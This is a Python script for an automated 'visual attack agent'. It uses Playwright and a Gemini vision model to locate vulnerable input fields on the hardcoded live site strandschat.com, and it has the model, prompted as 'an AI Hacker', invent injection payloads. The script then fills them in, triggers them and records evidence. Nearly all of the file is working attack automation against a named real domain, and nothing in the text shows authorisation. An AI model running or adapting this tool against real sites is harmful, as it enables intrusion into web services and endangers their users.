import json
import os
import asyncio
import base64
from dotenv import load_dotenv
from playwright.async_api import async_playwright
from langchain_google_genai import ChatGoogleGenerativeAI
from langchain_core.messages import HumanMessage

load_dotenv()

# Use a Vision-Capable Model
model = ChatGoogleGenerativeAI(
    model="gemini-2.0-flash-exp",
    api_key=os.getenv("GOOGLE_API_KEY"),
    temperature=0.1
)

def encode_image(image_path):
    """Helper to read image as base64 string"""
    if not image_path or not os.path.exists(image_path):
        return None
    with open(image_path, "rb") as image_file:
        return base64.b64encode(image_file.read()).decode("utf-8")

async def get_page_context(page):
    """Scrapes the text context (ID/Class/Text)"""
    elements = await page.query_selector_all('button, input, textarea, [role="button"], .btn, svg')
    context_list = []
    for i, el in enumerate(elements):
        try:
            if await el.is_visible():
                tag = await el.evaluate("e => e.tagName.toLowerCase()")
                eid = await el.get_attribute("id") or ""
                text = await el.inner_text()
                context_list.append(f"Index {i}: <{tag} id='{eid}'> Text='{text[:20]}'")
        except: pass
    return "\n".join(context_list[:50])

async def smart_visual_exploit(page, exploit_data):
    """
    Uses VISUAL MATCHING to find the target.
    """
    print("      👁️  AI comparing LIVE VIEW vs REFERENCE...")

    # 1. Capture LIVE screenshot
    live_shot_path = "current_view.png"
    await page.screenshot(path=live_shot_path)
    live_b64 = encode_image(live_shot_path)
    
    # 2. Load REFERENCE screenshot (from QA Agent)
    ref_path = exploit_data.get("ref_screenshot")
    ref_b64 = encode_image(ref_path)

    # 3. Get DOM Context
    dom_context = await get_page_context(page)

    # 4. Construct the Vision Prompt
    message_content = [
        {
            "type": "text",
            "text": f"""
            You are an AI Hacker using Visual Recognition.
            
            TASK: 
            Find the vulnerable element in the LIVE VIEW that matches the target in the REFERENCE VIEW.
            
            TARGET INFO:
            - Original Tag: {exploit_data['target'].get('tagName')}
            - Original ID: {exploit_data['target'].get('id')}
            - Vulnerability: {exploit_data.get('reason')}
            
            LIVE DOM ELEMENTS:
            {dom_context}
            
            INSTRUCTIONS:
            1. Compare the 'REFERENCE' image (where we found the bug) with the 'LIVE' image.
            2. Identify the correct element Index in the LIVE DOM list.
            3. Suggest a payload and trigger action.
            
            OUTPUT JSON ONLY:
            {{
              "input_index": <number>,
              "payload": "<payload string>",
              "trigger_action": "click_element" | "press_enter", 
              "trigger_index": <number for button>
            }}
            """
        },
        {
            "type": "image_url",
            "image_url": {"url": f"data:image/png;base64,{live_b64}"}
        }
    ]
    
    # Only add reference if it exists
    if ref_b64:
        message_content.insert(1, {
            "type": "text",
            "text": "REFERENCE VIEW (Target is here):"
        })
        message_content.insert(2, {
            "type": "image_url",
            "image_url": {"url": f"data:image/png;base64,{ref_b64}"}
        })

    # 5. Invoke Gemini Vision
    try:
        msg = HumanMessage(content=message_content)
        res = await model.ainvoke([msg])
        
        # Parse JSON
        content = str(res.content).replace("```json", "").replace("```", "").strip()
        if "{" in content: content = content[content.find("{"):content.rfind("}")+1]
        plan = json.loads(content)
        
        print(f"      🎯 Visual Match: Target is Index {plan.get('input_index')}")
        
        # 6. Execute
        elements = await page.query_selector_all('button, input, textarea, [role="button"], .btn, svg')
        
        # Fill Input
        idx = plan.get("input_index")
        if idx is not None and idx < len(elements):
            await elements[idx].fill(plan['payload'])
            print(f"      💉 Injected: {plan['payload']}")
        
        await page.wait_for_timeout(500)
        
        # Trigger
        trig_action = plan.get("trigger_action")
        trig_idx = plan.get("trigger_index")
        
        if trig_action == "press_enter":
            await elements[idx].press("Enter")
        elif trig_idx is not None and trig_idx < len(elements):
            await elements[trig_idx].click()
            
        print("      🚀 Exploit Detonated.")
        await page.wait_for_timeout(2000)

    except Exception as e:
        print(f"      ❌ Visual Attack Failed: {e}")
        # Fallback to text-based replay
        await execute_step(page, exploit_data)

# --- Helper to Replay Steps (Same as before) ---
async def execute_step(page, step_data):
    """Simple replay logic for setup steps"""
    try:
        action = step_data.get("action")
        target = step_data.get("target", {})
        if action == "fill_input":
            # Try heuristic match
            inputs = await page.query_selector_all(target.get('tagName', 'input'))
            if inputs: await inputs[0].fill("replay")
        elif action == "click_element":
            btns = await page.query_selector_all(target.get('tagName', 'button'))
            if btns: await btns[0].click()
        await page.wait_for_timeout(500)
    except: pass

async def run_attacks():
    print("🚀 INITIALIZING VISUAL ATTACK AGENT...")
    
    if not os.path.exists("final_exploit_plan.json"):
        print("❌ No plan found.")
        return

    with open("final_exploit_plan.json", "r") as f:
        data = json.load(f)
        exploits = data.get("exploits", [])

    os.makedirs("attack_evidence", exist_ok=True)

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=False)
        
        for i, exploit in enumerate(exploits, 1):
            context = await browser.new_context(record_video_dir="attack_videos/")
            page = await context.new_page()
            
            print(f"\n{'='*60}")
            print(f"⚔️ MISSION #{i}: Exploit {exploit.get('element_id')}")
            print(f"{'='*60}")
            
            # 1. Connect
            target_url = "http://strandschat.com"
            try:
                await page.goto(target_url, timeout=10000)
                print(f"  🌐 Connected to {target_url}")
            except Exception as e:
                print(f"  ❌ Could not connect to {target_url}: {e}")
                await context.close()
                continue 

            # 2. Replay Setup
            setup_steps = exploit.get("setup_steps", [])
            if setup_steps:
                print(f"  ⏪ Replaying {len(setup_steps)} setup steps...")
                for step in setup_steps:
                    await execute_step(page, step)
            
            # 3. VISUAL ATTACK
            await smart_visual_exploit(page, exploit)

            # 4. Evidence
            await page.screenshot(path=f"attack_evidence/mission_{i}_result.png")
            await context.close()

        await browser.close()

if __name__ == "__main__":
    asyncio.run(run_attacks())